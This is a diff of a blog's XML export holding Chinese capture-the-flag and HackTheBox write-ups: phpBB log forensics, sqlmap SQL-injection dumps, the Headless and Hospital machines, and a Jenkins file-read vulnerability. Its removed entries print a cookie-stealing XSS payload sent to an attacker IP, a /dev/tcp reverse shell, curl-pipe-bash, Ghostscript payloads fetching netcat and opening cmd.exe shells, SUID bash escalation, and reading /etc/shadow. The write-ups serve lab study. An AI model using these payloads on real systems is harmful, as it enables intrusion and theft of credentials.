role=&quot;menuitem&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;footer-link-text&quot;&gt;</span><br><span class="line">                                Terms</span><br><span class="line">                            &lt;/span&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;darkenwrapper&quot; class=&quot;darkenwrapper&quot; data-ajax-error-title=&quot;AJAX error&quot;</span><br><span class="line">                data-ajax-error-text=&quot;Something went wrong when processing your request.&quot;</span><br><span class="line">                data-ajax-error-text-abort=&quot;User aborted request.&quot; data-ajax-error-text-timeout=&quot;Your request timed out; please try again.&quot;</span><br><span class="line">                data-ajax-error-text-parsererror=&quot;Something went wrong with the request and the server returned an invalid reply.&quot;&gt;</span><br><span class="line">                    &lt;div id=&quot;darken&quot; class=&quot;darken&quot;&gt;</span><br><span class="line">                        &amp;nbsp;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;phpbb_alert&quot; class=&quot;phpbb_alert&quot; data-l-err=&quot;Error&quot; data-l-timeout-processing-req=&quot;Request timed out.&quot;&gt;</span><br><span class="line">                    &lt;a href=&quot;#&quot; class=&quot;alert_close&quot;&gt;</span><br><span class="line">                        &lt;i class=&quot;icon fa-times-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/i&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                    &lt;h3 class=&quot;alert_title&quot;&gt;</span><br><span class="line">                        &amp;nbsp;</span><br><span class="line">                    &lt;/h3&gt;</span><br><span class="line">                    &lt;p class=&quot;alert_text&quot;&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;phpbb_confirm&quot; class=&quot;phpbb_alert&quot;&gt;</span><br><span class="line">                    &lt;a href=&quot;#&quot; class=&quot;alert_close&quot;&gt;</span><br><span class="line">                        &lt;i class=&quot;icon fa-times-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/i&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                    &lt;div class=&quot;alert_text&quot;&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;a id=&quot;bottom&quot; class=&quot;anchor&quot; accesskey=&quot;z&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;img src=&quot;./cron.php?cron_type=cron.task.core.tidy_warnings&quot; width=&quot;1&quot;</span><br><span class="line">            height=&quot;1&quot; alt=&quot;cron&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;span&gt;</span><br><span class="line">        Greetings everyone,</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        I am just a visiting IT Contractor, it&#x27;s a fantastic company y&#x27;all have</span><br><span class="line">        here.</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        I hope to work with you all again soon.</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        Regards,</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        Alex Poole</span><br><span class="line">    &lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功找到<code>&lt;form action=&quot;http://10.10.0.78/update.php&quot; method=&quot;post&quot; id=&quot;login&quot; data-focus=&quot;username&quot;</code>，说明攻击者想上传到自己的ip上，url为<code>http://10.10.0.78/update.php</code></p>
+<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>承包商什么时候以管理员身份登录论坛的？</strong></p>
+<p>还是查表找到<code>phpbb_log</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from phpbb_log;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Bumblebee-HackTheBox/image-20240419102440293.png"></p>
+<p>可以将时间戳<code>1682506392</code>转换为标准时间，脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import datetime</span><br><span class="line">import pytz</span><br><span class="line"></span><br><span class="line">timestamp = 1682506392</span><br><span class="line">utc_timezone = pytz.timezone(&#x27;UTC&#x27;)</span><br><span class="line">dt = datetime.datetime.fromtimestamp(timestamp, utc_timezone)</span><br><span class="line">standard_time = dt.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line"></span><br><span class="line">print(standard_time)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h1><p><strong>论坛里有LDAP连接的明文凭据，密码是多少？</strong></p>
+<p>查询一下<code>phpbb_config</code>配置文件里的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from phpbb_config;</span><br></pre></td></tr></table></figure>
+
+<p>找到LDAP的密码<code>Passw0rd1</code></p>
+<p><img src="/article/Bumblebee-HackTheBox/image-20240419103322104.png"></p>
+<h1 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h1><p><strong>管理员用户的用户代理是什么？</strong></p>
+<p>在数据库的 <code>phpbb_log</code> 表中，寻找 <code>operation</code> 为 <code>LOG_ADMIN_AUTH_SUCCESS</code> 的记录，可以找到这两条 ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.255.254.2</span><br><span class="line">10.10.0.78</span><br></pre></td></tr></table></figure>
+
+<p>前面已经确定承包商的 ip 为 <code>10.10.0.78</code>，那么 <code>10.255.254.2</code> 就是管理员用户的 ip，在 <code>access.log</code> 中可以找到 <code>user-agent</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log | grep &quot;10.255.254.2&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h1><p><strong>承包商什么时候将自己添加到管理员组？ （世界标准时间）</strong></p>
+<p><code>phpbb_log</code>中有显示添加admin的时间戳，直接用前面脚本转换就行</p>
+<h1 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h1><p><strong>承包商何时下载了数据库备份？</strong></p>
+<p>在<code>access.log</code>筛选<code>backup</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log | grep &quot;backup&quot;</span><br></pre></td></tr></table></figure>
+
+<p>成功找到，不过要转换一下时区为<code>26/04/2023 11:01:38</code></p>
+<p><img src="/article/Bumblebee-HackTheBox/image-20240419104642901.png"></p>
+<h1 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h1><p><strong>access.log 中所述的数据库备份的大小（以字节为单位）是多少？</strong></p>
+<p>直接看响应包就行了，大小为34707</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.10.0.78 - - [26/Apr/2023:12:01:38 +0100] &quot;GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1&quot; 200 34707 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
-        <category>渗透</category>
+        <category>日志分析</category>
       </categories>
       <tags>
         <tag>HackTheBox</tag>
-        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
-    <title>CVE-2022-32991</title>
-    <url>/article/CVE-2022-32991.html</url>
-    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
+    <title>CVE-2022-28512</title>
+    <url>/article/CVE-2022-28512.html</url>
+    <content><![CDATA[<p>Fantastic Blog (CMS)是一个博客&#x2F;文章网络内容管理系统。该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞</p>
 <span id="more"></span>
 
-<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
-<p>对各个页面的参数就行sqlmap扫描</p>
-<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
+<h1 id="CVE-2022-28512"><a href="#CVE-2022-28512" class="headerlink" title="CVE-2022-28512"></a>CVE-2022-28512</h1><p>打开题目</p>
+<p><img src="/article/CVE-2022-28512/image-20240413231746967.png"></p>
+<p>按照漏洞描述在<code>/single.php</code>路径的参数id存在sql注入漏洞，我们手动注入一下</p>
+<p><img src="/article/CVE-2022-28512/image-20240413231855630.png"></p>
+<p>可以发现测试成功，我们bp抓包并保存下来，然后使用sqlmap</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l &quot;./requests/1.txt&quot;</span><br></pre></td></tr></table></figure>
 
 <p>得到flag</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l &quot;./requests/1.txt&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/CVE-2022-28512/image-20240413232423326.png"></p>
 ]]></content>
       <categories>
         <category>春秋云镜</category>
@@ -316,252 +282,24 @@
       </categories>
   </entry>
   <entry>
-    <title>Headless-HackTheBox</title>
-    <url>/article/Headless-HackTheBox.html</url>
-    <content><![CDATA[<p>XSS跨站脚本攻击、sh脚本提权</p>
+    <title>CVE-2022-32991</title>
+    <url>/article/CVE-2022-32991.html</url>
+    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
 <span id="more"></span>
 
-<h1 id="Headless-HackTheBox"><a href="#Headless-HackTheBox" class="headerlink" title="Headless-HackTheBox"></a>Headless-HackTheBox</h1><p>信息搜集</p>
-<p>使用nmap扫描一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.8</span><br></pre></td></tr></table></figure>
+<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
+<p>对各个页面的参数就行sqlmap扫描</p>
+<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
 
-<p><img src="/article/Headless-HackTheBox/image-20240331155537558.png"></p>
-<p>可以发现5000端口是开放的，继续扫一下目录</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331163111975.png"></p>
-<p>访问<code>/dashboard</code>发现只有admin才可以，我们注意到cookie值为JWT加密，拿到揭秘网站验证下猜想</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331173230979.png"></p>
-<p>cookie为user用户，那么我们要想访问必须拿到admin的cookie</p>
-<p>访问<code>/support</code>路径存在类似提交留言的功能，应该是存在xss注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>提交后会发现提示Hacking</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331172458874.png"></p>
-<p>说明思路没错，那么我们可以利用xss注入得到admin的cookie值，payload如下</p>
-<p>（利用fetch函数对我们服务器发送网络请求）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=1 onerror=fetch(&quot;http://10.10.14.34:80/?cookie=&quot;+document.cookie);&gt;</span><br></pre></td></tr></table></figure>
-
-<p>经过多次尝试，发现我触发payload的条件必须在<code>User-Agent</code>和<code>message</code>参数都有才行。而国外师傅们不同wp中<code>User-Agent</code>都是payload触发点，但是message参数值的不同。有的是下图这样而有的是<code>message=test;</code></p>
-<p><img src="/article/Headless-HackTheBox/image-20240331172008225.png"></p>
-<p>不过好在是拿到了admin的cookie</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331171946128.png"></p>
-<p>成功访问<code>/dashboard</code>，然后抓包发现data参数存在命令注入</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331174558986.png"></p>
-<p>尝试直接反弹shell发现不行，那么试一下用curl命令</p>
-<ol>
-<li><p>首先在本地创建shell.sh文件，写入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.34/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后在本地开启http服务，用来被靶机读取文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后用curl命令去读取我们的shell.sh文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date=;curl 10.10.14.34/shell.sh |bash</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>成功反弹shell</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331175715080.png"></p>
-<p>得到user的flag</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331175800113.png"></p>
-<p>我们尝试用sudo提权</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-
-<p>发现只有<code>/usr/bin/syscheck</code>可用</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331180740517.png"></p>
-<p>我们strings命令查看下得到源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$EUID&quot; -ne 0 ]; then</span><br><span class="line">  exit 1</span><br><span class="line">last_modified_time=$(/usr/bin/find /boot -name &#x27;vmlinuz*&#x27; -exec stat -c %Y &#123;&#125; + | /usr/bin/sort -n | /usr/bin/tail -n 1)</span><br><span class="line">formatted_time=$(/usr/bin/date -d &quot;@$last_modified_time&quot; +&quot;%d/%m/%Y %H:%M&quot;)</span><br><span class="line">/usr/bin/echo &quot;Last Kernel Modification Time: $formatted_time&quot;</span><br><span class="line">disk_space=$(/usr/bin/df -h / | /usr/bin/awk &#x27;NR==2 &#123;print $4&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;Available disk space: $disk_space&quot;</span><br><span class="line">load_average=$(/usr/bin/uptime | /usr/bin/awk -F&#x27;load average:&#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">/usr/bin/echo &quot;System load average: $load_average&quot;</span><br><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
-
-<p>重点看下面这段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ! /usr/bin/pgrep -x &quot;initdb.sh&quot; &amp;&gt;/dev/null; then</span><br><span class="line">  /usr/bin/echo &quot;Database service is not running. Starting it...&quot;</span><br><span class="line">  ./initdb.sh 2&gt;/dev/null</span><br><span class="line">else</span><br><span class="line">  /usr/bin/echo &quot;Database service is running.&quot;</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
-
-<p>这段代码大概意思就是，if语句先使用pgrep命令检测<code>initdb.sh</code>是否存在，如果不存在则执行该sh文件并丢弃错误输出</p>
-<p>而我们在根目录下并没有找到该sh文件，那么我们可以简单利用一下</p>
-<ol>
-<li><p>首先创建<code>initdb.sh</code>文件，写入提升权限的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;chmod u+s /bin/bash&quot; &gt; initdb.sh</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>然后赋予该sh脚本的执行权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x initdb.sh</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>最后sudo执行<code>/usr/bin/syscheck</code>，成功运行sh脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/syscheck</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p><img src="/article/Headless-HackTheBox/image-20240331181954932.png"></p>
-<p>运行sh脚本后，用-p参数启动<code>Bash Shell</code>并以特权模式运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -p</span><br></pre></td></tr></table></figure>
-
-<p>得到root的flag</p>
-<p><img src="/article/Headless-HackTheBox/image-20240331182210478.png"></p>
+<p>得到flag</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
 ]]></content>
       <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hospital-HackTheBox</title>
-    <url>/article/Hospital-HackTheBox.html</url>
-    <content><![CDATA[<p>Ubuntu内核版本漏洞提权、CVE-2023-36664</p>
-<span id="more"></span>
-
-<h1 id="Hospital-HackTheBox"><a href="#Hospital-HackTheBox" class="headerlink" title="Hospital-HackTheBox"></a>Hospital-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240112180806750.png"></p>
-<p>发现8080端口和443端口有http服务</p>
-<p>然后发现3389端口是启用了ms-wbt-server服务</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115204915296.png"></p>
-<p>在对443端口的扫描没有收获，并且只有邮箱登录界面无法注册</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115164807440.png"></p>
-<p>接着看向8080端口，我们随便注册用户登录后发现有文件上传功能</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115164932259.png"></p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>经过测试pht和phar后缀都可以绕过检测，然后dirsearch扫描出文件上传路径为<code>/uploads/</code></p>
-<p>尝试上传一句话木马，发现虽然能成功但是并不能执行命令</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115165831471.png"></p>
-<p>于是借助大神写的shell工具来反弹shell <a href="https://github.com/flozz/p0wny-shell">脚本链接</a></p>
-<p>直接下载shell.php然后上传，用bp将php后缀改为phar（后面测试了一下发现pht后缀会有问题，只能显示源码不解析）</p>
-<p>然后访问文件保存路径<code>/uploads/shell.phar</code></p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115171307639.png"></p>
-<p>由于不稳定我们反弹到本地机器上</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115171656947.png"></p>
-<p>经过一番搜索，在<code>/var/ww/html/config.php</code>找到数据库用户和密码</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115172212732.png"></p>
-<p>然后连接数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p -h localhost</span><br></pre></td></tr></table></figure>
-
-<p>找到用户信息</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115172643646.png"></p>
-<p>对admin的解码一下得到密码（早知道弱口令爆破了hhh）</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115173020295.png"></p>
-<p>不过好像没什么用</p>
-<p>于是参考国外师傅wp原来是利用Ubuntu内核版本漏洞去提权 <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">exp链接</a></p>
-<p>我们把exp下载到本地然后开启http服务，在靶机用wget命令复制过去</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115181536436.png"></p>
-<p>然后chmod给个执行权限，成功提权</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115181701556.png"></p>
-<p>这里的root并不是真正的root用户，所以我们还得寻找可用信息</p>
-<p>我们查看当前用户的哈希值，发现有drwilliams的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Hospital-HackTheBox/image-20240115182451909.png"></p>
-<p>然后用john爆破得到密码</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115184235946.png"></p>
-<p>得到密码后访问443端口登录后，注意到一封邮件</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115200651567.png"></p>
-<p>谷歌翻译一下，应该是要给Brown发送.eps文件</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115200710233.png"></p>
-<p>网上搜索出相关漏洞 <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">参考文章</a></p>
-<blockquote>
-<p>漏洞原理大概就是GPL PostScript&#x2F;PDF 解释器 Ghostscript 无法正确处理管道设备的权限验证，如果处理格式错误的文档文件，可能会导致执行任意命令</p>
-</blockquote>
-<p>我们可以这样利用，先用该exp去创建第一个<code>.eps</code>文件构造curl命令我们本地的nc程序，然后Brown使用解释器打开后触发该命令下载nc程序；然后再次发送一个<code>.eps</code>文件去利用nc执行主动弹shell的命令</p>
-<p>注意被攻击机为Brown的windows系统</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115201559484.png"></p>
-<p>执行过程如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE_2023_36664_exploit.py --inject --payload &quot;curl 10.10.14.54:8000/nc64.exe -o nc.exe&quot; --filename file.eps</span><br></pre></td></tr></table></figure>
-
-<p>下载nc64.exe并保存为nc.exe</p>
-<p>成功下载nc程序<img src="/article/Hospital-HackTheBox/image-20240115202041934.png"></p>
-<p>然后就再发一个邮件去主动nc连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE_2023_36664_exploit.py --inject --payload &quot;nc.exe 10.10.14.54 1028 -e cmd.exe&quot; --filename file.eps</span><br></pre></td></tr></table></figure>
-
-<p>发送后被Brown打开，成功nc连接</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115204415877.png"></p>
-<p>然后dir找到文件，查看一下得到密码</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115204646134.png"></p>
-<p>由于我们前面namp扫描出3389端口是ms-wbt-server服务，我们就可以尝试连接一下</p>
-<p>开始我是使用xfreerdp工具连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /u:drbrown /v:10.10.11.241</span><br></pre></td></tr></table></figure>
-
-<p>然后惊讶的发现直接连接到被攻击机</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115210010248.png"></p>
-<p>访问桌面得到user的flag（不过确实不太方便root提权）</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>所以就换成rpcclient连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient -U drbrown 10.10.11.241</span><br></pre></td></tr></table></figure>
-
-<p>然后执行querydispinfo命令，查看关于当前连接到计算机的显示器的详细信息</p>
-<p>注意到管理员信息是与访客共享的</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115211414355.png"></p>
-<p>那么我们可以在刚刚连接的windows靶机上，curl我们本地的shell文件来实现RCE</p>
-<p>（shell.php前文已经给了参考链接）</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115212041160.png"></p>
-<p>由于知道是共享的，所以我们直接访问<code>/shell.php</code>得到root的flag</p>
-<p><img src="/article/Hospital-HackTheBox/image-20240115211953335.png"></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Jenkins文件读取漏洞(CVE-2024-23897)</title>
-    <url>/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897.html</url>
-    <content><![CDATA[<p>最近实在不知道做什么，跟着p神复现下比较火的漏洞</p>
-<span id="more"></span>
-
-<h1 id="Jenkins文件读取漏洞-CVE-2024-23897"><a href="#Jenkins文件读取漏洞-CVE-2024-23897" class="headerlink" title="Jenkins文件读取漏洞(CVE-2024-23897)"></a>Jenkins文件读取漏洞(CVE-2024-23897)</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用的是vulhub靶场的环境 <a href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2024-23897">下载地址</a></p>
-<p>cd进入目录下，依次执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>
-
-<p>访问8080端口即可</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Jenkins提供了一个命令行的接口，用户可以下载一个命令行客户端<code>jenkins-cli.jar</code>到本地，并调用该客户端来执行一些Jenkins的功能。但是用户使用<code>jenkins-cli.jar</code>时，命令行是传到服务端解析的，而不是在jenkins-cli.jar里解析。这就导致一个问题，就是Jenkins服务端解析命令行时使用了一个第三方库<a href="https://github.com/kohsuke/args4j">args4j</a>，这个库实现了Linux中一个常见的功能——如果一个参数是以<code>@</code>开头，则会被自动认为是一个文件名，文件内容会被读取作为参数。所以就造成Jenkins文件读取漏洞。</p>
-<blockquote>
-<p>类似的还有PHP5.5以前，设置POST参数时，如果传入的参数值是<code>@</code>开头，则也会被认为是文件名，并读取该文件，造成文件读取漏洞。</p>
-</blockquote>
-<h2 id="Jenkins权限系统"><a href="#Jenkins权限系统" class="headerlink" title="Jenkins权限系统"></a>Jenkins权限系统</h2><p>正常情况下，cli这个功能的权限控制方案和Jenkins默认权限方案相同</p>
-<p>Jenkins有几种鉴权方案：</p>
-<ul>
-<li><strong>Anyone can do anything</strong> 没有任何权限认证，匿名用户即可登录后台执行Groovy脚本</li>
-<li><strong>Legacy Mode</strong> 旧鉴权模式</li>
-<li><strong>Logged-in users can do anything</strong> 任意登录的用户可以做任何事，这是默认的权限选项</li>
-<li><strong>Matrix-based security</strong> 细颗粒度权限控制，需要安装插件才支持这个鉴权模式</li>
-</ul>
-<p>默认安装后是第3种方案，非常简单，没有垂直权限的区分，登录后的用户就是管理员，没有登录的用户就是匿名用户。</p>
-<p>这种权限方案中，管理员可以设置“匿名用户可读”选项：</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215237335.png"></p>
-<p>这个选项在后台的<code>“Manage Jenkins” -&gt; “Security”</code>中管理员可以将其开启或关闭，默认是关闭的。实际测试中，如果我们访问Jenkins首页，发现强制跳转到登录页面，或者啥功能都没有直接报权限错误，就说明关闭了“匿名用户读”选项。</p>
-<p>我们不妨测试一下关闭了匿名用户可读功能，那么大部分的cli命令也就无法调用，会出现<code>&quot;ERROR: anonymous is missing the Overall/Read permission&quot;</code>的错误：</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215426442.png"></p>
-<p>但有2个命令例外，就是help和who-am-i。这两个命令是无需任何权限的，所以可以用来读取文件</p>
-<p><img src="/article/Jenkins%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2024-23897/image-20240408215733356.png"></p>
-<p>在Vulhub环境中，“匿名用户可读”是开启的，某些Jenkins版本默认安装时可能也是开启的，但通常管理员会关闭这个功能。另外，大部分企业的Jenkins会安装<code>“Matrix-based security”</code>这样的插件来管理权限，也会影响“匿名用户可读”选项的值。总而言之，这个选项的开关取决于管理员是否想让未登录用户看到一些Jenkins的任务。</p>
-<p>总结一下就是：</p>
-<ul>
-<li>当Jenkins开启了“匿名用户可读”功能，大部分命令都可以被调用</li>
-<li>当Jenkins关闭了“匿名用户可读”功能，只有help和who-am-i命令可以被调用</li>
-</ul>
